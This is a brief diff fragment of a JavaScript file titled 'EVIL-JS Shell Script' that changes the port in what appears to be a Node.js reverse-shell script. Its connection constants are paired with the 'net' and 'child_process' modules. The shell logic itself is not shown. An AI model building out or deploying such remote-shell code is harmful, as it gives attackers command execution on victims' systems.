@@ -3,7 +3,7 @@
 // EVIL-JS Shell Script
 
 const SERVER = "127.0.0.1";
-const PORT = 4444;
+const PORT = 9926;
 
 var Net = require("net");
 var Process = require("child_process");
